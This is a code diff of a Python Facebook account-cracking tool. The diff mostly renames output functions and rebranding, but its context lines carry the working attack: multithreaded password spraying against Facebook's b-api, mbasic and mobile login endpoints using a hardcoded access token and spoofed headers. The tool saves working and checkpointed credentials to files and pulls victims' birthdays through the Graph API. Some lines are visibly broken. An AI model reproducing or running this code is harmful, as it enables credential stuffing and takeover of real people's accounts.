@@ -119,11 +119,11 @@ def banner():
 	logo()
 def hasil(ok,cp):
 	if len(ok) != 0 or len(cp) != 0:
-		ADNAN('\n\n\033[0m The Prosess Done...')
-		ADNAN('\n\033[1;92mTotal OK : %s •  Total CP : %s'%(str(len(ok)),str(len(cp))));exit()
-		#ADNAN('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
+		IMTIAZ_AKING('\n\n\033[0m The Prosess Done...')
+		IMTIAZ_AKING('\n\033[1;92mTotal OK : %s •  Total CP : %s'%(str(len(ok)),str(len(cp))));exit()
+		#IMTIAZ_AKING('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
 	else:
-		ADNAN('\n\033[0mUps..Tidak Mendapatkan Hasil')
+		IMTIAZ_AKING('\n\033[0mUps..Tidak Mendapatkan Hasil')
 		exit()
 class __crack__:
 	def __init__(self):
@@ -133,37 +133,37 @@ class __crack__:
 			self.apk = input(" [*] File Name : ")
 			print (' [*]=============================================')
 			self.id = IMTIAZ(self.apk).read().splitlines()
-			ADNAN(' [*] Total ID : %s'%(len(self.id)))
+			IMTIAZ_AKING(' [*] Total ID : %s'%(len(self.id)))
 			print (' [✓] Are You Went To Continue : Type Y')
 		except:
-			ADNAN('\n [!] File Not Found In Storage')
+			IMTIAZ_AKING('\n [!] File Not Found In Storage')
 			input('\n [*] Press Enter To Back');readline___Public_Xml();print("[M] Menual Password ");print('[D] Default Password ')
      
 		_jokowi_kontol_ = input(" [*] Choose : ")
 		if _jokowi_kontol_ in ('M', 'm'):
 			print('[*] Function Added in new update ')
 		
-			ADNAN('\nEnter Password 123456 or 123456789 For OLd Idz ')
+			IMTIAZ_AKING('\nEnter Password 123456 or 123456789 For OLd Idz ')
 			while True:
 				pwek = input('\nEnter Password : ')
-				#ADNAN('Sandi > %s'%(pwek))
+				#IMTIAZ_AKING('Sandi > %s'%(pwek))
 				if pwek == '':
-					ADNAN('\nJangan Kosong')
+					IMTIAZ_AKING('\nJangan Kosong')
 					time.sleep(1)
 					exit()
 				elif len(pwek)<=5:
-					ADNAN('\nSandi Harus 6 Karakter Lebih Tidak Masalah')
+					IMTIAZ_AKING('\nSandi Harus 6 Karakter Lebih Tidak Masalah')
 				else:
 					def _sempak_(bse=None):
 						boy = input('\nPilih : ')
 						if boy == '':
-							ADNAN('\nJangan Kosong')
+							IMTIAZ_AKING('\nJangan Kosong')
 							time.sleep(1);self._sempak_()
 						elif boy == "1" or boy == "01":
-							ADNAN('\n[•] Result OK saved to OK.txt')
-							ADNAN('[•] Result CP saved to CP.txt')
-							ADNAN('\n\tCrack Processing...\n')
-							ADNAN('\n\tCrack Processing...\n\n');logo()
+							IMTIAZ_AKING('\n[•] Result OK saved to OK.txt')
+							IMTIAZ_AKING('[•] Result CP saved to CP.txt')
+							IMTIAZ_AKING('\n\tCrack Processing...\n')
+							IMTIAZ_AKING('\n\tCrack Processing...\n\n');logo()
 							with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
 								for ikeh in self.id:
 									try:
@@ -174,9 +174,9 @@ class __crack__:
 							os.remove(self.apk)
 							hasil(ok,cp)
 						elif boy == "2" or boy == "02":
-							ADNAN('\n[•] Result OK saved to OK.txt')
-							ADNAN('[•] Result CP saved to CP.txt')
-							ADNAN('\n\tCrack Processing...\n\n');logo()
+							IMTIAZ_AKING('\n[•] Result OK saved to OK.txt')
+							IMTIAZ_AKING('[•] Result CP saved to CP.txt')
+							IMTIAZ_AKING('\n\tCrack Processing...\n\n');logo()
 							with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
 								for ikeh in self.id:
 									try:
@@ -186,10 +186,10 @@ class __crack__:
 							os.remove(self.apk)
 							hasil(ok,cp)
 						elif boy == "3" or boy == "03":
-							ADNAN('\nHasil RESULTS Tersimpan Di > multiresuts.txt')
-							ADNAN('[•] Result CP saved to CP.txt')
-							ADNAN('\n\tCrack Processing...\n\n')
-							ADNAN('\n\tCrack Processing...\n\n');logo()
+							IMTIAZ_AKING('\nHasil RESULTS Tersimpan Di > multiresuts.txt')
+							IMTIAZ_AKING('[•] Result CP saved to CP.txt')
+							IMTIAZ_AKING('\n\tCrack Processing...\n\n')
+							IMTIAZ_AKING('\n\tCrack Processing...\n\n');logo()
 							with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
 								for ikeh in self.id:
 									try:
@@ -201,18 +201,18 @@ class __crack__:
 							hasil(ok,cp)
 						else:
 							exit()
-					ADNAN('\n01.) Metode b-api ')
-					ADNAN('02.) Metode mbasic ')
-					ADNAN('03.) Metode Mobile ')
+					IMTIAZ_AKING('\n01.) Metode b-api ')
+					IMTIAZ_AKING('02.) Metode mbasic ')
+					IMTIAZ_AKING('03.) Metode Mobile ')
 					_sempak_(pwek.split(','))
 					break
 		elif _jokowi_kontol_ in ('Y', 'y'):
 			print (' [*]=============================================')
-			ADNAN('\n\t------[ Method Crack ]-----')
+			IMTIAZ_AKING('\n\t------[ Method Crack ]-----')
 			print (' [*]=============================================')
-			ADNAN(' [1] FB KING Method 1 ')
-			ADNAN(' [2] FB KING Method 2  [ Pro ]')
-			ADNAN(' [3] FB KING Method 3   ')
+			IMTIAZ_AKING(' [1] ADNAN-KING Method 1 ')
+			IMTIAZ_AKING(' [2] ADNAN-KING Method 2  [ Pro ]')
+			IMTIAZ_AKING(' [3] ADNAN-KING Method 3   ')
 			print (' [*]=============================================')
 			self.__pler__()
 		else:
@@ -232,7 +232,7 @@ class __crack__:
 				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
 			p = Prof_IMtiaz("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
 			if "access_token" in p:
-				ADNAN('\r\033[1;92m[Successful-FB KING] %s | %s%s      '%(user,pw,tahun(user)))
+				IMTIAZ_AKING('\r\033[1;92m[Successful-ADNAN-KING] %s | %s%s      '%(user,pw,tahun(user)))
 				wrt = '%s - %s %s'%(user,pw,tahun(user))
 				ok.append(wrt)
 				open('OK.txt','a').write('%s\n' % wrt)
@@ -244,7 +244,7 @@ class __crack__:
 					cp_ttl = Prof_Imtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
 					month, day, year = cp_ttl.split('/')
 					month = bulan_ttl[month]
-					ADNAN('\r\033[1;91m[Checkpoint-FB KING] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
+					IMTIAZ_AKING('\r\033[1;91m[Checkpoint-ADNAN-KING] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
 					wrt = '%s - %s - %s %s %s%s'% (user,pw,day,month,year,tahun(user))
 					cp.append(wrt)
 					open('CP.txt','a').write('%s\n' % wrt)
@@ -255,7 +255,7 @@ class __crack__:
 					year  = ''
 				except:
 					pass
-				ADNAN('\r\033[1;91m[Checkpoint-FB KING] %s | %s%s      '%(user,pw,tahun(user)))
+				IMTIAZ_AKING('\r\033[1;91m[Checkpoint-ADNAN-KING] %s | %s%s      '%(user,pw,tahun(user)))
 				wrt = '%s - %s%s' % (user,pw,tahun(user))
 				cp.append(wrt)
 				open('CP.txt','a').write('%s\n' % wrt)
@@ -264,7 +264,7 @@ class __crack__:
 		loop += 1
 	def __mbasic__(self, user, _sempak_):
 		global ok,cp,loop
-		sys.stdout.write('\r\033[1;97m [FB KING] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
+		sys.stdout.write('\r\033[1;97m [ADNAN-KING] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
 		sys.stdout.flush()
 		for pw in _sempak_:
 			pw = pw.lower()
@@ -281,7 +281,7 @@ class __crack__:
 			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
 			if 'c_user' in ses.cookies.get_dict():
-				ADNAN('\r\033[1;32m[Successful-FB KING] %s | %s      ' % (user,pw))
+				IMTIAZ_AKING('\r\033[1;32m[Successful-ADNAN-KING] %s | %s      ' % (user,pw))
 				wrt = '%s - %s' % (user,pw)
 				ok.append(wrt)
 				open('OK.txt','a').write('%s\n' % wrt)
@@ -292,7 +292,7 @@ class __crack__:
 					token = IMTIAZ('token.txt').read()
 					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
 					month, day, year = cp_ttl.split('/')
-					month = bulan_ttl[month].ADNAN('\r\033[1;91m[Checkpoint-FB KING] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
+					month = bulan_ttl[month].IMTIAZ_AKING('\r\033[1;91m[Checkpoint-ADNAN-KING] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
 					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
 					cp.append(wrt)
 					open('CP.txt','a').write('%s\n' % wrt)
@@ -303,7 +303,7 @@ class __crack__:
 					year  = ''
 				except:
 					pass
-				ADNAN('\r\033[1;91m[Checkpoint-FB KING] %s | %s%s      ' % (user,pw,tahun(user)))
+				IMTIAZ_AKING('\r\033[1;91m[Checkpoint-ADNAN-KING] %s | %s%s      ' % (user,pw,tahun(user)))
 				wrt = '%s - %s%s'%(user,pw,tahun(user))
 				cp.append(wrt)
 				open('CP.txt','a').write('%s\n' % wrt)
@@ -312,7 +312,7 @@ class __crack__:
 		loop += 1
 	def __mfb__(self, user, _sempak_):
 		global ok,cp,loop
-		sys.stdout.write('\r\033[1;97m [FB KING] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
+		sys.stdout.write('\r\033[1;97m [ADNAN-KING] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
 		sys.stdout.flush()
 		for pw in _sempak_:
 			pw = pw.lower()
@@ -329,7 +329,7 @@ class __crack__:
 			_headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
 			if 'c_user' in ses.cookies.get_dict():
-				ADNAN('\r\033[1;92m[Successful-FB KING] %s | %s      '%(user,pw))
+				IMTIAZ_AKING('\r\033[1;92m[Successful-ADNAN-KING] %s | %s      '%(user,pw))
 				wrt = '%s - %s - %s' % (user,pw)
 				ok.append(wrt)
 				open('OK.txt','a').write('%s\n' % wrt)
@@ -341,7 +341,7 @@ class __crack__:
 					cp_ttl = Prof_Aking('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
 					month, day, year = cp_ttl.split('/')
 					month = bulan_ttl[month]
-					ADNAN('\r\033[1;91m[Checkpoint-FB KING] %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
+					IMTIAZ_AKING('\r\033[1;91m[Checkpoint-ADNAN-KING] %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
 					wrt = '%s - %s - %s %s %s'%(user,pw,day,month,year)
 					cp.append(wrt)
 					open('CP.txt','a').write('%s\n' % wrt)
@@ -352,7 +352,7 @@ class __crack__:
 					year  = ''
 				except:
 					pass
-				ADNAN('\r\033[1;91m[Checkpoint-FB KING] %s | %s%s      ' % (user,pw,tahun(user)))
+				IMTIAZ_AKING('\r\033[1;91m[Checkpoint-ADNAN-KING] %s | %s%s      ' % (user,pw,tahun(user)))
 				wrt = '%s - %s%s'%(user,pw,tahun(user))
 				cp.append(wrt)
 				open('CP.txt','a').write('%s\n' % wrt)
@@ -362,13 +362,13 @@ class __crack__:
 	def __pler__(self):
 		yan = input('\n[•] Choose : ')
 		if yan == '':
-			ADNAN('\Choose Error ')
+			IMTIAZ_AKING('\Choose Error ')
 			exit()
 		elif yan in ('1', '01'):
-			ADNAN('\n[•] Result OK saved to OK.txt')
-			ADNAN('[•] Result CP saved to CP.txt')
-			ADNAN('\n\tCrack Processing...\n')
-			ADNAN('\n\tCrack Processing...\n\n');logo()
+			IMTIAZ_AKING('\n[•] Result OK saved to OK.txt')
+			IMTIAZ_AKING('[•] Result CP saved to CP.txt')
+			IMTIAZ_AKING('\n\tCrack Processing...\n')
+			IMTIAZ_AKING('\n\tCrack Processing...\n\n');logo()
 			with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
 				for yntkts in self.id:
 					try:
@@ -390,10 +390,10 @@ class __crack__:
 			os.remove(self.apk)
 			hasil(ok,cp)
 		elif yan in ('2', '02'):
-			ADNAN('\n[•] Result OK saved to OK.txt')
-			ADNAN('[•] Result CP saved to CP.txt')
-			ADNAN('\n\tCrack Processing...\n')
-			ADNAN('\n\tCrack Processing...\n\n');logo()
+			IMTIAZ_AKING('\n[•] Result OK saved to OK.txt')
+			IMTIAZ_AKING('[•] Result CP saved to CP.txt')
+			IMTIAZ_AKING('\n\tCrack Processing...\n')
+			IMTIAZ_AKING('\n\tCrack Processing...\n\n');logo()
 			with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
 				for yntkts in self.id:
 					try:
@@ -416,7 +416,7 @@ class __crack__:
 			hasil(ok,cp)
 		elif yan in ('3', '03'):
 			
-			ADNAN('\n\tCrack Processing...\n\n');logo()
+			IMTIAZ_AKING('\n\tCrack Processing...\n\n');logo()
 			with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
 				for yntkts in self.id:
 					try:
@@ -438,7 +438,7 @@ class __crack__:
 			os.remove(self.apk)
 			hasil(ok,cp)
 		else:
-			ADNAN('\nSalah')
+			IMTIAZ_AKING('\nSalah')
 			time.sleep(1)
 			self.__pler__()
 def tahun(fx):
@@ -484,17 +484,19 @@ imtiazak_ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; w
 imtiazak_ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
 banner="""\033[94m
 
-\033[1;93m            _____  _   _          _   _        _  _______ _   _  _____ 
-\033[1;93m      /\   |  __ \| \ | |   /\   | \ | |      | |/ /_   _| \ | |/ ____|
-\033[1;92    /  \  | |  | |  \| |  /  \  |  \| |______| ' /  | | |  \| | |  __ 
-\033[1;97m    / /\ \ | |  | | . ` | / /\ \ | . ` |______|  <   | | | . ` | | |_ |
-\033[1;91m  / ____ \| |__| | |\  |/ ____ \| |\  |      | . \ _| |_| |\  | |__| |
-\033[1;93m  /_/    \_\_____/|_| \_/_/    \_\_| \_|      |_|\_\_____|_| \_|\_____|                                                          
+O))))))))O)) O))          O))   O))  O))O)))     O))   O))))   
+O))      O)    O))        O))  O))   O))O) O))   O)) O)    O)) 
+O))      O)     O))       O)) O))    O))O)) O))  O))O))        
+\033[1;93mO))))))  O))) O)          O) O)      O))O))  O)) O))O))        
+\033[1;92mO))      O)     O))       O))  O))   O))O))   O) O))O))   O))))
+\033[1;97mO))      O)      O)       O))   O))  O))O))    O) )) O))    O) 
+\033[1;91mO))      O)))) O))        O))     O))O))O))      O))  O)))))
+                                                               
 
  [*]=============================================
     Author           :  \033[1;93mBMX ADNAN AHMED
     \033[1;92mFacebook.        : https://www.facebook.com/jonising.com12
-    \033[1;94mTeam             : BCG-72 👿👈
+    \033[1;94mTeam             : Black Mafia 👿👈
     \033[1;93m❤ U Hetars       : ADNAN-KING
  [*]=============================================
    \033[1;31m  Use (Flight) Airplane Mod For Speed Up \033[1;37m
